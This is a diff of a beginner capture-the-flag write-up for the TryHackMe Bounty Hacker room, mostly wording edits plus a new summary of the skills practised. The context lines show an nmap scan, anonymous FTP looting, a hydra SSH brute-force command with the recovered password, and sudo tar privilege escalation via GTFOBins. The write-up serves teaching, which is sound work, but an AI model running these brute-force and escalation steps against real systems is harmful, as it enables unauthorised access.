@@ -9,6 +9,7 @@
 - [Nmap scan](#nmap-scan)
 - [FTP enumeration](#ftp-enumeration)
 - [SSH bruteforce](#ssh-bruteforce)
+- [Privilege escalation](#privilege-escalation)
 - [Conclusion](#conclusion)
 
 ## Nmap scan
@@ -50,13 +51,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 124.93 seconds
 ```
 
-- FTP port is open and anonymous login is enabled (port 21)
+- FTP port is open and anonymous login is allowed (port 21)
 - SSH port is open (port 22)
 - A webserver is running on the target (port 80)
 
 ## FTP enumeration
 
-Let's log in to the FTP service as anonymous and see what files we can get :  
+Let's login to the FTP service as `anonymous` and see what files we can find :  
 ```
 attacker@AttackBox:~/Documents/THM/CTF/Bounty_Hacker$ ftp 10.10.198.38
 Connected to 10.10.198.38.
@@ -73,7 +74,7 @@ ftp> ls
 226 Directory send OK.
 ```
 
-Let's get those files and see what's inside :  
+Let's get those files on our attacker machine and see what's inside :  
 ```
 attacker@AttackBox:~/Documents/THM/CTF/Bounty_Hacker$ cat locks.txt 
 rEddrAGON
@@ -109,14 +110,14 @@ attacker@AttackBox:~/Documents/THM/CTF/Bounty_Hacker$ cat task.txt
 -lin
 ```
 
-We have a possible username "lin". The file locks.txt seems to be a password list.
+We have a possible username `lin`. The file `locks.txt` seems to be a password list.
 
 **Question : Who wrote the task list ?**  
 **Answer : lin**  
 
 ## SSH bruteforce
 
-Since we have a username "lin" and a password list, we can try to brute force some services on the target. Let's try with SSH first using [Hydra](https://github.com/vanhauser-thc/thc-hydra) :  
+Since we have a username `lin` and a password list, we can try to brute force some services on the target. Let's try with `SSH` first using [hydra](https://github.com/vanhauser-thc/thc-hydra) :  
 ```
 attacker@AttackBox:~/Documents/THM/CTF/Bounty_Hacker$ hydra -l lin -P locks.txt 10.10.198.38 ssh
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -133,13 +134,13 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-21 18:04:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-10-21 18:04:56
 ```
 
-We successfully brute forced lin's SSH password.
+We successfully brute forced `lin`'s SSH password !
 
 **Question : What service can you bruteforce with the text file found ?**  
-**Answer : SSH**
+**Answer : SSH**  
 
 **Question : What is the users password ?**  
-**Answer : RedDr4gonSynd1cat3**
+**Answer : RedDr4gonSynd1cat3**  
 
 Now let's login to SSH using the credentials we found :  
 ```
@@ -186,7 +187,7 @@ User lin may run the following commands on bountyhacker:
     (root) /bin/tar
 ```
 
-We can run tar as root. We can search for "tar" on [GTFOBins](https://gtfobins.github.io/) :  
+We can run tar as root. We can search for `tar` on [GTFOBins](https://gtfobins.github.io/) :  
 ![](https://i.imgur.com/AS8xbPU.jpg)  
 
 Let's use this exploit and get a root shell :  
@@ -219,4 +220,12 @@ THM{**************}
 
 ## Conclusion
 
-This CTF was very easy and simple. I think it is a very good CTF for very beginners. Thanks for this room and thanks for reading my write ups !
+This CTF was very easy and simple. I think it is a very good CTF for very beginners.
+We practiced : 
+- Ports/Services enumeration using [nmap](https://nmap.org/)
+- FTP enumeration using `anonymous` login
+- SSH bruteforce using [hydra](https://github.com/vanhauser-thc/thc-hydra)
+- Basic linux enumeration
+- Basic privilege escalation
+
+Thanks for this room and thanks for reading my write ups !
